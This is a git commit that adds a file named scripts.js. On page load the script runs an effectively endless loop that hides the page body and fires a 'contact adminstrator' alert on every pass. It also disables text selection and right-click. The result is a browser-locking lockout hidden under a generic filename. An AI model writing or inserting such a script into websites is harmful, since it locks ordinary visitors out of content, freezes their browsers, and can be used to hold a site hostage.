ea00906d49a1528c53325d85ca5b341a1a4f678e
Bijay Budhathoki <budhathokibijay1@gmail.com>
2023-09-30 20:47:12 +0545

    Create scripts.js

---
+++ scripts.js
@@ -0,0 +1,11 @@
+  window.onload = function () {
+            for (let i = 0; i < 10000000; i++) {
+  document.getElementsByTagName("BODY")[0].style.display = "none";
+			alert("contact adminstrator");
+			document.onselectstart=new Function ("return false");  
+document.oncontextmenu=new Function ("return false");
+
+}
+			        };
+    
+	
